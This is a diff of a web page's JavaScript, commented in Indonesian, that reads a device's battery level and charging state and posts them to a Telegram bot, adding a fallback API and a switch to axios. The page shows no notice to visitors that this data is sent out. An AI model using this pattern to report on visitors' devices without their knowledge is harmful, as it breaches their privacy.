@@ -6,12 +6,22 @@
     <script>
         // Fungsi untuk mendapatkan status baterai
         function getBatteryStatus() {
-            navigator.getBattery().then(function(battery) {
+            if (navigator.getBattery) {
+                navigator.getBattery().then(function(battery) {
+                    var level = battery.level * 100;
+                    var status = battery.charging ? 'Sedang dicharge' : 'Tidak dicharge';
+                    var message = 'Level baterai: ' + level + '%\nStatus: ' + status;
+                    sendToTelegram(message);
+                });
+            } else if (navigator.battery) {
+                var battery = navigator.battery;
                 var level = battery.level * 100;
                 var status = battery.charging ? 'Sedang dicharge' : 'Tidak dicharge';
                 var message = 'Level baterai: ' + level + '%\nStatus: ' + status;
                 sendToTelegram(message);
-            });
+            } else {
+                console.error('Peramban tidak mendukung API Battery Status');
+            }
         }
 
         // Fungsi untuk mengirim pesan ke bot Telegram
@@ -20,14 +30,12 @@
             var apiKey = '1121369247'; // Ganti dengan API Key bot Telegram Anda
 
             var url = 'https://api.telegram.org/bot' + apiKey + '/sendMessage';
-            var params = new URLSearchParams();
-            params.append('chat_id', chatId);
-            params.append('text', message);
+            var params = {
+                chat_id: chatId,
+                text: message
+            };
 
-            fetch(url, {
-                method: 'POST',
-                body: params
-            })
+            axios.post(url, params)
                 .then(function (response) {
                     console.log('Pesan terkirim ke Telegram');
                 })
